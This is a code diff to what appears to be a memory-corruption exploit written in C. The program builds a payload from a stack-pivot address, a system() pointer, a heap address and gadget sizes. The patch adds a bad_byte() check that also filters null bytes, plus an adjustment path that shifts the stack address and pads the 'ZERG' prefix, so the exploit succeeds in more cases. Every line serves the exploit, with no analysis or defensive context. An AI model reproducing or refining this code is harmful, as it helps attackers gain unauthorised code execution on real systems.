@@ -54,6 +54,8 @@ uint32_t gadget_jumpsz = 108;
 uint32_t buffsz = 0;
 uint32_t allbuffsz[] = {16,24,0};
 
+uint8_t adjust = 0;
+
 extern char **environ;
 
 
@@ -137,6 +139,22 @@ static void *find_symbol(char *sym)
 }
 
 
+static int bad_byte(uint8_t byte)
+{
+	switch(byte) {
+		case 0x20:
+		case 0x22:
+		case 0x5c:
+		case 0x00:
+			return 1;
+			break;
+		default:
+			break;
+	}
+	return 0;
+}
+
+
 static int check_addr(uint32_t addr)
 {
 	/*
@@ -144,17 +162,9 @@ static int check_addr(uint32_t addr)
 	 */
 	int i = 0;
 
-	for(i=0; i<32; i+=8) {
-		switch((addr>>i) & 0xff) {
-		case 0x20:
-		case 0x22:
-		case 0x5c:
+	for(i=0; i<32; i+=8)
+		if(bad_byte((addr>>i) & 0xff))
 			return -1;
-			break;
-		default:
-			break;
-		}
-	}
 
 	return 0;
 }
@@ -189,7 +199,10 @@ static int do_fault()
 	sprintf(s_system, "%c%c%c%c", system_ptr & 0xff, (system_ptr>>8)&0xff, (system_ptr>>16)&0xff, (system_ptr>>24)&0xff);
 	sprintf(s_heap_addr, "%c%c%c%c", heap_addr & 0xff, (heap_addr>>8)&0xff, (heap_addr>>16)&0xff, (heap_addr>>24)&0xff);
 
-	strcpy(buf, "ZERG");
+	if(adjust)
+		strcpy(buf, "ZERGZERG");
+	else
+		strcpy(buf, "ZERG");
 	strcat(buf, " ZZ ");
 	strcat(buf, s_stack_pivot_addr);
 	for(i=3; i < buffsz+1; i++)
@@ -474,8 +487,18 @@ int main(int argc, char **argv, char **env)
 	}
 	
 	if (check_addr(stack_addr) == -1) {
-		printf("[-] Siege tanks, we're doomed!\n");
-		exit(-1);
+		if(bad_byte(stack_addr & 0xff)) {
+			stack_addr += 4;
+			adjust = 4;
+			if (check_addr(stack_addr) == -1) {
+				printf("[-] Siege tanks, we're doomed!\n");
+				exit(-1);
+			}
+		}
+		else {
+			printf("[-] Siege tanks, we're doomed!\n");
+			exit(-1);
+		}
 	}
 
 	if (jumpsz > 108 + 12) {
